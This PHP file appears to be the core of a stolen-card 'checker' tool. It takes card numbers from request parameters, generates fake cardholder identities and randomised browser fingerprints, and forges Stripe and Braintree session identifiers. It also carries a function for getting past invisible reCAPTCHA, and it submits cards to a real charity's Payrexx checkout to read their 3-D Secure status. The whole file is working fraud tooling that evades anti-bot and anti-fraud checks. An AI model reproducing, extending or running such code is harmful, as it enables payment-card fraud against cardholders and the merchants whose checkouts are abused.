<?php

error_reporting(0);
require __DIR__ . '/CardFormatter.php';
require __DIR__ . '/Curlz.php';

/**
 * @class Init
 * @version 1.0
 * @author Raizel_&_Unique By Thryssa
 */
class Init
{
    /** Static Properties */
    public static ?string $card, $cc, $mm, $month, $yy, $year, $cvv, $bin, $last4, $gateName, $proxy;
    public static string $fullName, $firstName, $lastName, $email, $phone, $street, $city, $state, $stateCode, $zip;

    public function __construct()
    {
        /** Initialize Card Formatter Class */
        $cardFormatter = new CardFormatter($_GET['card']);

        /** Set Static Properties */
        self::$card = $cardFormatter::getInitializedValue();
        self::$gateName = $_GET['gateName'];
        self::$proxy = $_GET['proxy'];
        self::$bin = substr(self::$card, 0, 6);
        self::$last4 = substr(self::$card, -4);

        /** Card Info */
        [self::$cc, self::$mm, self::$yy, self::$cvv] = explode('|', self::$card);

        /** Month In Single Digit Without `0` */
        self::$mm = ltrim(self::$mm, '0');

        /** Month In Full Digit Including `0` */
        self::$month = strlen(self::$mm) == 1 ? '0' . self::$mm : self::$mm;

        /** Card Year In 2 Digit */
        self::$yy = strlen(self::$yy) == 4 ? substr(self::$yy, 2) : self::$yy;

        /** Card Year In 4 Digit */
        self::$year = strlen(self::$yy) == 2 ? '20' . self::$yy : self::$yy;

        /** Generate Random User Data */
        self::generateRandomUser();
    }

    /**
     * @method cardType
     * @access public
     * @param string $type
     * @return string|null
     * @example Returns Card Type
     */
    public static function cardType(string $type): string|null
    {
        /** Returns Card Type In UpperCase Ex: VISA, MASTERCARD, AMEX, DISCOVER */
        if ($type == 'FORMAT') {
            if (substr(self::$card, 0, 1) == 3) return 'AMEX';
            if (substr(self::$card, 0, 1) == 4) return 'VISA';
            if (substr(self::$card, 0, 1) == 5) return 'MASTERCARD';
            else return 'DISCOVER';
        }

        /** Returns Card Type In PascalCase  Ex: Visa, Mastercard, Amex, Discover */
        if ($type == 'Format') {
            if (substr(self::$card, 0, 1) == 3) return 'Amex';
            if (substr(self::$card, 0, 1) == 4) return 'Visa';
            if (substr(self::$card, 0, 1) == 5) return 'Mastercard';
            else return 'Discover';
        }

        /** Returns Card Type In LowerCase Ex: visa, mastercard, amex, discover */
        if ($type == 'format') {
            if (substr(self::$card, 0, 1) == 3) return 'amex';
            if (substr(self::$card, 0, 1) == 4) return 'visa';
            if (substr(self::$card, 0, 1) == 5) return 'mastercard';
            else return 'discover';
        }

        return NULL;
    }

    /**
     * @method randomAlphaNumeric
     * @access public
     * @return string
     * @example Returns AlphaNumeric String
     */
    public static function randomAlphaNumeric(int $length): string
    {
        try {
            $preDefinedString = '0123456789abcdefghijklmnopqrstuvwxyz';
            $preDefinedStringLength = strlen($preDefinedString);
            $randomString = '';

            for ($i = 0; $i < $length; $i++)
                $randomString .= $preDefinedString[random_int(0, $preDefinedStringLength - 1)];
            return $randomString;
        } catch (\Random\RandomException $e) {
            return $e;
        }
    }

    /**
     * @method randomUserAgents
     * @access public
     * @return string
     * @example Returns Random User Agent
     */
    public static function randomUserAgents(): string
    {
        try {
            return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/" .
                (random_int(1, 100) > 50
                    ? random_int(533, 537)
                    : random_int(600, 603)) .
                "." .
                random_int(1, 50) .
                " (KHTML, like Gecko) Chrome/" .
                "118.0." . random_int(3000, 4999) . "." . random_int(10, 99) .
                " Safari/" .
                (random_int(1, 100) > 50
                    ? random_int(533, 537)
                    : random_int(600, 603));
        } catch (\Random\RandomException $e) {
            return $e;
        }
    }

    /**
     * @method sessionId
     * @access public
     * @return string
     * @example Returns Generated Braintree SessionId
     */
    public static function sessionId(): string
    {
        $data = random_bytes(16);
        $data[6] = chr((ord($data[6]) & 0x0f) | 0x40);
        $data[8] = chr((ord($data[8]) & 0x3f) | 0x80);
        return vsprintf("%s%s-%s-%s-%s-%s%s%s", str_split(bin2hex($data), 4));
    }

    /**
     * @method correlationId
     * @access public
     * @return string
     * @example Returns Generated Braintree correlationId
     */
    public static function correlationId(): string
    {
        $randomBytes = random_bytes(16);
        return bin2hex($randomBytes);
    }

    /**
     * @method stripeGUID
     * @access public
     * @return string
     * @example Returns Generated Stripe GUID
     */
    public static function stripeGUID(): string
    {
        $data = random_bytes(16);
        $data[6] = chr((ord($data[6]) & 0x0f) | 0x40);
        $data[8] = chr((ord($data[8]) & 0x3f) | 0x80);
        return vsprintf("%s%s-%s-%s-%s-%s%s%s", str_split(bin2hex($data), 4));
    }

    /**
     * @method stripeMUID
     * @access public
     * @return string
     * @example Returns Generated Stripe MUID
     */
    public static function stripeMUID(): string
    {
        $random_number = mt_rand();
        $device_info = Init::randomUserAgents() . $_SERVER["REMOTE_ADDR"] . $_SERVER["HTTP_ACCEPT_LANGUAGE"];
        return hash("sha256", $random_number . $device_info);
    }

    /**
     * @method stripeSID
     * @access public
     * @return string
     * @example Returns Generated Stripe SID
     */
    public static function stripeSID(): string
    {
        $timestamp = time();
        $user_info = Init::randomUserAgents() . $_SERVER["REMOTE_ADDR"] . $_SERVER["HTTP_ACCEPT_LANGUAGE"];
        $random_number = mt_rand();
        return hash("sha256", $timestamp . $user_info . $random_number);
    }

    /**
     * @method generateRandomUser
     * @access private
     * @return void
     * @example Generate Random User Data
     */
    private function generateRandomUser(): void
    {
        /** Get And Set Random User Data */
        $data = json_decode(file_get_contents(__DIR__ . '/Data/RandomData.json'), TRUE);
        self::$firstName = $data['firstName'][array_rand($data['firstName'])];
        self::$lastName = $data['lastName'][array_rand($data['lastName'])];
        self::$fullName = self::$firstName . ' ' . self::$lastName;
        self::$email = self::$firstName . '' . self::$lastName . rand(0, 9999) . $data['emailDomains'][array_rand($data['emailDomains'])];
        $address = $data['address'][array_rand($data['address'])];
        self::$phone = $address['areaCode'] . random_int(1000000, 9999999);
        self::$street = $address['street'];
        self::$city = $address['city'];
        self::$state = $address['state'];
        self::$stateCode = $address['stateCode'];
        self::$zip = $address['zip'];
    }

    /**
     * @method parseString
     * @access public
     * @param string $string
     * @param string $start
     * @param string $end
     * @return string
     * @example Get Middle String Between Two Strings
     */
    public static function parseString(string $start, string $end, string $data): string
    {
        return trim(strip_tags(explode($data, explode($end, $start)[1] ?? "")[0]));
    }

    /** 
     * @method bypassInvisibleCaptcha
     * @access public
     * @param string $url
     * @return string
     * @example Bypass Invisible Recaptcha v2/v3
     */
    public static function bypassInvisibleCaptcha(string $url): string
    {
        $k = self::parseString($url, '&k=', '&');
        $co = self::parseString($url, '&co=', '&');
        $v = self::parseString($url, '&v=', '&');
        $size = self::parseString($url, '&size=', '&');
        $hl = self::parseString($url, '&hl=', '&');

        /** Capture Initial Token */
        $first = self::parseString(file_get_contents('https://www.google.com/recaptcha/api2/anchor?ar=1&k=' . $k . '&co=' . $co . '&hl=' . $hl . '&v=' . $v . '&size=' . $size . '&cb=vrenhtoys' . rand(0, 9) . 'jy'), 'id="recaptcha-token" value="', '"');

        /** Capture Recaptcha Value */
        $opts = [
            'http' => [
                'method' => 'POST',
                'header' => 'Content-Type: application/x-www-form-urlencoded',
                'content' => http_build_query(
                    [
                        'v' => $v,
                        'reason' => 'q',
                        'c' => $first,
                        'k' => $k,
                        'co' => $co,
                        'hl' => $hl,
                        'size' => $size
                    ]
                )
            ]
        ];
        $context = stream_context_create($opts);
        return self::parseString(file_get_contents('https://www.google.com/recaptcha/api2/reload?k=' . $k . '', FALSE, $context), '"rresp","', '"');
    }

    /** 
     * @method binDetails
     * @access public
     * @return array
     * @example Get Bin Details
     */
    public static function binDetails(): array|null
    {
        $curl = new Curlz();
        $resp = $curl->GET('https://api.juspay.in/cardbins/' . self::$bin . '?merchant_id=senrysa&options.check_atm_pin_auth_support=true&options.check_mandate_support=true', NULL, FALSE);
        $resp = json_decode($resp, TRUE);
        return is_array($resp) ? $resp : NULL;
    }

    /** 
     * @method get3DResult
     * @access public
     * @return string
     * @example Get Card 3dVerification Using 3dSecureV2
     */
    public static function get3DResult(): string|null
    {
        $curl = new Curlz();

        /** Split-CC */
        $a = substr(self::$cc, 0, 4);
        $b = substr(self::$cc, 4, 4);
        $c = substr(self::$cc, 8, 4);
        $d = substr(self::$cc, -4, 4);

        /** Req-1 */
        $resp = $curl->post(
            'https://checkout.payrexx.com/?pspId=44&lang=en',
            'instance=fondationaline&pspId=44&card%5Bnumber%5D=' . $a . '+' . $b . '+' . $c . '+' . $d . '&card%5Bcardholder%5D=' . self::$firstName . '+' . self::$lastName . '&card%5Bexp_month%5D=' . self::$month . '&card%5Bexp_year%5D=' . self::$year . '&card%5Bcvc%5D=' . self::$cvv . '&card%5Bbrand%5D=' . self::cardType('format') . '&amount=100&currency=USD&isTokenization=false&isPreAuthorization=false&isMoto=false&email=' . self::$email . '',
            [
                'Accept: application/json, text/javascript, */*; q=0.01',
                'Accept-Language: en-US,en;q=0.9',
                'Connection: keep-alive',
                'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
                'Origin: https://checkout.payrexx.com',
                'Referer: https://checkout.payrexx.com/?pspId=44&lang=en',
                'Sec-Fetch-Dest: empty',
                'Sec-Fetch-Mode: cors',
                'Sec-Fetch-Site: same-origin',
                'X-Requested-With: XMLHttpRequest'
            ]
        );

        $threeDSMethodURL = self::parseString($resp, '"threeDSMethodURL":"', '"');
        $threeDSServerTransID = self::parseString($resp, '"threeDSServerTransID":"', '"');
        $header = json_encode([
            "threeDSServerTransID" => $threeDSServerTransID,
            "threeDSMethodNotificationURL" => "https://dispatcher.payrexx.com/auth/threeDSecureV2.php",
        ]);
        $JWT = str_replace(['+', '/', '='], ['-', '_', ''], base64_encode($header));

        /** Req-2 */
        $resp = $curl->post(
            stripslashes($threeDSMethodURL),
            "threeDSMethodData=$JWT",
            [
                'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language: en-US,en;q=0.9',
                'cache-control: max-age=0',
                'content-type: application/x-www-form-urlencoded',
                'origin: https://fondationaline.payrexx.com',
                'referer: https://fondationaline.payrexx.com/',
                'sec-fetch-dest: iframe',
                'sec-fetch-mode: navigate',
                'sec-fetch-site: cross-site',
                'sec-fetch-user: ?1',
                'upgrade-insecure-requests: 1'
            ]
        );

        /** Req-3 */
        $resp = $curl->post(
            'https://checkout.payrexx.com/?pspId=44&lang=en',
            'instance=fondationaline&pspId=44&card%5Bnumber%5D=' . $a . '+' . $b . '+' . $c . '+' . $d . '&card%5Bcardholder%5D=' . self::$firstName . '+' . self::$lastName . '&card%5Bexp_month%5D=' . self::$month . '&card%5Bexp_year%5D=' . self::$year . '&card%5Bcvc%5D=' . self::$cvv . '&card%5Bbrand%5D=' . self::cardType('format') . '&amount=100&currency=USD&isTokenization=false&isPreAuthorization=false&isMoto=false&email=' . self::$email . '&threeDSServerTransID=' . $threeDSServerTransID . '&threeDSVersion=2.2.0&authData%5Bindicator%5D=N&authData%5BcolorDepth%5D=24&authData%5BbrowserLanguage%5D=en-US&authData%5BbrowserJavaEnabled%5D=false&authData%5BbrowserJavascriptEnabled%5D=true&authData%5BbrowserScreenHeight%5D=1080&authData%5BbrowserScreenWidth%5D=1920&authData%5BbrowserTZ%5D=-330&authData%5BnotificationURL%5D=https%3A%2F%2Fdispatcher.payrexx.com%2Fauth%2FthreeDSecureV2.php&authData%5BthreeDSRequestorURL%5D=https%3A%2F%2Ffondationaline.payrexx.com',
            [
                'Accept: application/json, text/javascript, */*; q=0.01',
                'Accept-Language: en-US,en;q=0.9',
                'Connection: keep-alive',
                'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
                'Origin: https://checkout.payrexx.com',
                'Referer: https://checkout.payrexx.com/?pspId=44&lang=en',
                'Sec-Fetch-Dest: empty',
                'Sec-Fetch-Mode: cors',
                'Sec-Fetch-Site: same-origin',
                'X-Requested-With: XMLHttpRequest'
            ]
        );
        $transStatus = self::parseString($resp, '"transStatus":"', '"');

        $status = array(
            'Y' => 'Authentication/Account Verification Successful',
            'N' => 'Not Authenticated/Account Not Verified; Transaction Denied.',
            'U' => 'Authentication/Account Verification Could Not Be Performed.',
            'A' => 'Attempts Processing Performed; Not Authenticated/Verified.',
            'C' => 'Challenge Required; Additional Authentication Is Required.',
            'R' => 'Authentication/Account Verification Rejected.',
            'D' => 'Challenge (Decoupled Authentication)',
            'I' => 'Authentication Not Requested By The 3DS Server',
        );

        /** Delete Cookie */
        $curl->deleteCookie();

        if (empty($transStatus)) return NULL;
        else return "[Status: $transStatus] : $status[$transStatus]";
    }
}

/** Self Initialize Class */
$curl = new Curlz();
$init = new Init();

/** Get Static Properties */
$card = Init::$card;
$cc = Init::$cc;
$mm = Init::$mm;
$month = Init::$month;
$yy = Init::$yy;
$year = Init::$year;
$cvv = Init::$cvv;
$bin = Init::$bin;
$last4 = Init::$last4;
$gateName = Init::$gateName;

/** Set RandomUserData */
$fullName = Init::$fullName;
$fname = Init::$firstName;
$lname = Init::$lastName;
$email = Init::$email;
$street = Init::$street;
$city = Init::$city;
$state = Init::$state;
$stateCode = Init::$stateCode;
$zip = Init::$zip;
$phone = Init::$phone;

/** Set UUIDs */
$sessionId = Init::sessionId();
$correlationId = Init::correlationId();
$guid = Init::stripeGUID();
$muid = Init::stripeMUID();
$sid = Init::stripeSID();
$types = Init::cardType('format');
$typem = Init::cardType('Format');
$typel = Init::cardType('FORMAT');
